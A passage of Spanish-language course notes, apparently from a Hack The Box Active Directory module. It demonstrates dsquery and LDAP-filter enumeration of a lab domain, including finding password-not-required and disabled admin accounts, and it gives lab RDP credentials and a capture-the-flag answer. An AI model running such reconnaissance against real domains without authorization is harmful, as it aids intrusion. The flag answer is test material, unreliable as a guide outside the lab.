"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

### **Búsqueda por computadora**

```powershell
PS C:\htb> dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

### **Búsqueda con comodines**

Podemos utilizar una [búsqueda con comodines de dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) para ver todos los objetos en una OU (Unidad Organizativa), por ejemplo.

```powershell
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

<SNIP>
```

Por supuesto, podemos combinar `dsquery` con los filtros de búsqueda LDAP que elijamos. A continuación, se buscan usuarios con la flag `PASSWD_NOTREQD` establecida en el atributo `userAccountControl`.

### **Usuarios con atributos específicos establecidos (PASSWD\_NOTREQD)**

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

### **Buscar controladores de dominio**

El siguiente filtro de búsqueda busca todos los controladores de dominio en el dominio actual, limitándose a cinco resultados.

```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

#### Explicación del filtrado LDAP

Notarás en las consultas anteriores que usamos cadenas como `userAccountControl:1.2.840.113556.1.4.803:=8192`. Estas cadenas son consultas LDAP comunes que también se pueden usar con varias herramientas diferentes, incluidas AD PowerShell, ldapsearch y muchas otras. Vamos a desglosarlas rápidamente:

`userAccountControl:1.2.840.113556.1.4.803:`Especifica que estamos buscando los [atributos de Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) para un objeto. Esta parte puede cambiar para incluir tres valores diferentes que explicaremos a continuación cuando busquemos información en AD (también conocidos como [identificadores de objeto (OID)](https://ldap.com/ldap-oid-reference-guide/) .

\
`=8192`representa la máscara de bits decimal que queremos que coincida en esta búsqueda. Este número decimal corresponde a un indicador de atributo UAC correspondiente que determina si un atributo como `password is not required` o `account is locked`está configurado. Estos valores pueden combinarse y generar múltiples entradas de bits diferentes. A continuación, se incluye una lista rápida de valores potenciales.

**Valores UAC**

![texto](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

**Cadenas de coincidencia de OID**

Los OID son reglas que se utilizan para hacer coincidir valores de bits con atributos, como se vio anteriormente. Para LDAP y AD, existen tres reglas de coincidencia principales:

1. `1.2.840.113556.1.4.803`

Al utilizar esta regla como hicimos en el ejemplo anterior, estamos diciendo que el valor del bit debe coincidir completamente para cumplir con los requisitos de búsqueda. Es ideal para hacer coincidir un atributo singular.

2. `1.2.840.113556.1.4.804`

Al utilizar esta regla, queremos que nuestros resultados muestren cualquier coincidencia de atributo si algún bit de la cadena coincide. Esto funciona en el caso de un objeto que tiene varios atributos establecidos.

3. `1.2.840.113556.1.4.1941`

Esta regla se utiliza para hacer coincidir los filtros que se aplican al nombre distintivo de un objeto y buscará en todas las entradas de propiedad y membresía.

**Operadores logicos**

Al crear cadenas de búsqueda, podemos utilizar operadores lógicos para combinar valores para la búsqueda. Los operadores `&` `|` y `!`se utilizan para este fin. Por ejemplo, podemos combinar varios [criterios de búsqueda](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) con el operador `& (and)` de la siguiente manera:\
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

El ejemplo anterior establece el primer criterio de que el objeto debe ser un usuario y lo combina con la búsqueda de un valor de bit UAC de 64 (la contraseña no se puede cambiar). Un usuario con ese atributo establecido coincidiría con el filtro. Puede llevar esto aún más lejos y combinar varios atributos como `(&(1) (2) (3))`. Los operadores `!`(no) y `|`(o) pueden funcionar de manera similar. Por ejemplo, nuestro filtro anterior se puede modificar de la siguiente manera:\
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

Esto buscaría cualquier objeto de usuario que `NO` tenga configurado el atributo "La contraseña no se puede cambiar". Si pensamos en usuarios, grupos y otros objetos en AD, nuestra capacidad de búsqueda con consultas LDAP es bastante amplia.

Se pueden hacer muchas cosas con los filtros UAC, los operadores y la coincidencia de atributos con reglas OID. Por ahora, esta explicación general debería ser suficiente para cubrir este módulo. Para obtener más información y profundizar en el uso de este tipo de búsqueda de filtros, consulte el módulo [LDAP de Active Director](/ethical-hacking-cheatsheet/active-directory/active-directory/ldap.md)y .

***

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.112.164 (ACADEMY-EA-MS01)
Usuario " htb-student "
Contraseña " Academia_student_AD! "
```

```
xfreerdp /v:10.129.112.164 /u:htb-student /p:Academy_student_AD!
```

### Pregunta 1

Enumere la información de configuración de seguridad del host y proporcione su `AMProductVersion`.

```powershell
PS C:\Windows\system32> Get-MpComputerStatus

AMEngineVersion                 : 0.0.0.0
AMProductVersion                : 4.18.2109.6  # Buscábamos este dato
AMRunningMode                   : Not running
AMServiceEnabled                : False
AMServiceVersion                : 0.0.0.0
AntispywareEnabled              : False
AntispywareSignatureAge         : 4294967295
AntispywareSignatureLastUpdated :
AntispywareSignatureVersion     : 0.0.0.0
AntivirusEnabled                : False
AntivirusSignatureAge           : 4294967295
AntivirusSignatureLastUpdated   :
AntivirusSignatureVersion       : 0.0.0.0
BehaviorMonitorEnabled          : False
ComputerID                      : 077DD3DD-5AF2-43E2-900E-D8B5FF616DFA
ComputerState                   : 0
FullScanAge                     : 4294967295
```

### Pregunta 2

¿Qué usuario de dominio aparece explícitamente como miembro del grupo Local Admins el host de destino?

```powershell
PS C:\Windows\system32> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
INLANEFREIGHT\adunn
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Domain Users
The command completed successfully.
```

Encontramos al usuario que aparece como administrador local en el host: `adunn`

### Pregunta 3

Utilizando las técnicas aprendidas en esta sección, busque la flag oculta en el campo de descripción de una cuenta deshabilitada con privilegios administrativos. Envíe la flag como respuesta.

Hay varias maneras de obtener usuarios deshabilitados en un sistema AD, vamos a probar uno de ellos:

```powershell
PS C:\Windows\system32> dsquery user -disabled
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Betty Ross,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Msexchapproval 1F05a927-3Be2-4Fb9-Aa03-B59fe3b56f4c,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox Bb558c35-97F1-4Cb9-8Ff7-D53741dc928c,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Msexchdiscovery E0dc1c29-89C3-4034-B678-E6c29d823ed9,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Msexchdiscoverymailbox D919ba05-46A6-415F-80Ad-7E09334bb852,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Migration.8F3e7716-2011-43E4-96B1-Aba62d229136,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Federatedemail.4C1f4d8b-8179-4148-93Bf-00A95fa1e042,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox{D0e409a0-Af9b-4720-92Fe-Aac869b0d201},CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox{2Ce34405-31Be-455D-89D7-A7c7da7a0daa},CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Con el comando anterior no encontramos mucha info relevante, así que vamos a hacer una búsqueda más avanzada filtrando por `SamAccountName` y `Description`:

```powershell
PS C:\Users\htb-student\Desktop> Get-ADUser -Filter {Enabled -eq $false} -Property SamAccountName, Description | Select-Object SamAccountName, Description

SamAccountName       Description
--------------       -----------
guest                Built-in account for guest access to the computer/domain
krbtgt               Key Distribution Center Service Account
bross                HTB{LD@P_I$_W1ld}
$725000-9jb50uejje9f
sm_752cbd23e73649258
sm_8b3ff26494d94da89
sm_434e56f7c43f4534a
sm_51dc5f77b78546d7b
sm_c6ccf50003bf4310b
sm_c7c8c6f5727449fbb
sm_925f7acdff9344408
sm_820598b3d6c548a08
sm_8f47aca8186c4f0da
```

Ahora si, encontramos al usuario `bross` y la flag en la descripción 🏆

***

Ahora hemos utilizado nuestra posición para realizar enumeraciones con credenciales con herramientas en hosts de ataque Linux y Windows y utilizando herramientas integradas e información de host y dominio validada. Hemos demostrado que podemos acceder a hosts internos, pulverizar contraseñas y envenenar LLMNR/NBT-NS y que podemos utilizar herramientas que ya residen en los hosts para realizar nuestras acciones. Ahora daremos un paso más y abordaremos un TTP que todo pentester de AD debería tener en su arsenal `Kerberoasting`.
